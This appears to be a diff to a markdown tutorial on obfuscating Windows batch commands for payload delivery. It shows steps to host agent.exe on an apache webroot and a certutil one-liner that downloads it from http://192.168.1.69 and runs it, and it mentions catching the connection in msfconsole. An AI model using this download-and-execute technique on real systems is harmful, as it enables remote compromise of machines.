@@ -185,7 +185,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
 
 <br />
 
-      1º - Store your agent.exe into your local apache webroot (linux)
+      1º - Store your agent.exe into your apache webroot (linux)
       cp agent.exe /var/www/html/agent.exe
 
       2º - Start apache2 webserver (linux)
@@ -203,7 +203,11 @@ The above string can be obfuscated using the **batch special character: "** <br 
       cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.69/agent.exe %TEMP%\\agent.exe && start %TEMP%\\agent.exe
       exit
 
-![batch obfuscation](http://i.)
+![batch obfuscation certutil.bat](http://i.)
+
+- Recibing the connection in msfconsole 
+
+![batch obfuscation certutil.bat](http://i.)
 
 ---
 
